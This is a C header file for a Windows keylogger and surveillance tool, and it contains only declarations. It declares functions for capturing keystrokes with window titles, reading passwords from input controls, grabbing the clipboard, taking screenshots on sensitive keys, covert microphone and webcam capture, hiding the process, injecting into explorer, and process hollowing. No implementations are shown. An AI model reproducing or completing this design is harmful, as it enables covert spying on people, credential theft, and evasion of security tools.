#ifndef WINKEY_H
#define WINKEY_H

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include "ntapi.h"
#include <psapi.h>
#include <winternl.h>
#include <processthreadsapi.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <mferror.h>
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mf.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mfuuid.lib")
#define INITGUID
#include <initguid.h>

DEFINE_GUID(IID_IMMDeviceEnumerator,0xA95664D2, 0x9614, 0x4F35, 0xA7, 0x46, 0xDE, 0x8D, 0xB6, 0x36, 0x17, 0xE6);
DEFINE_GUID(CLSID_MMDeviceEnumerator,0xBCDE0395, 0xE52F, 0x467C, 0x8E, 0x3D, 0xC4, 0x57, 0x92, 0x91, 0x69, 0x2E);
DEFINE_GUID(IID_IAudioClient,0x1CB9AD4C, 0xDBFA, 0x4c32, 0xB1, 0x78, 0xC5, 0x8D, 0xC2, 0x8D, 0xA0, 0x3F);
DEFINE_GUID(IID_IAudioCaptureClient,0xC8ADBD64, 0xE71E, 0x48a0, 0xA4, 0x0C, 0xFA, 0x0D, 0xC5, 0x8F, 0xE2, 0xC3);
#include <mmdeviceapi.h>
#include <audioclient.h>
#ifdef __cplusplus
extern "C" 
{
#endif
extern volatile int g_camera_run;
extern volatile int g_micro_run;
#ifdef __cplusplus
}
#endif

PPEB GetPEB(void);
int vk_to_char(DWORD vkCode, char *out);
void get_time(char *buf);
char *special_touch(DWORD vk);
void get_window_title(char *title);

void hide_process(wchar_t *new_name);
static DWORD find_pid(void);
int inject_into_explorer(void);
int capture_screen(LPCWSTR path);
void on_special_event(void);
void screenshot_on_sensitive_key(DWORD vk, DWORD modifiers);
int is_password_field(HWND hwnd);
int allow_app(char *exe);
void read_clipboard(char *buffer, size_t size);
int is_sensitive_key(DWORD vk);

LPVOID load_pe_from_file(LPCWSTR path, DWORD *outSize);
BOOL hollow_process(LPCWSTR hostPath, LPVOID payload, DWORD payloadSize);
void capture_micro(void);
int read_password_from_control(HWND hEdit, char *out, size_t out_size);
int start_camera(void);

int create_sound(HRESULT *hr, IMMDeviceEnumerator **enumerator);
int get_micro(HRESULT *hr, IMMDeviceEnumerator *enumerator, IMMDevice **device);
int active_client_audio(HRESULT *hr, IMMDevice *device, IAudioClient **audioClient);
int take_format_audio(HRESULT *hr, IAudioClient *audioClient, WAVEFORMATEX **format);
int init_wasapi(HRESULT *hr, IAudioClient *audioClient, WAVEFORMATEX *format);
int get_service(HRESULT *hr, IAudioClient *audioClient, IAudioCaptureClient **captureClient);
int start_service(HRESULT *hr, IAudioClient *audioClient);


typedef NTSTATUS (NTAPI *PFN_NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

typedef NTSTATUS (NTAPI *PFN_NtUnmapViewOfSection)(HANDLE, PVOID);


#endif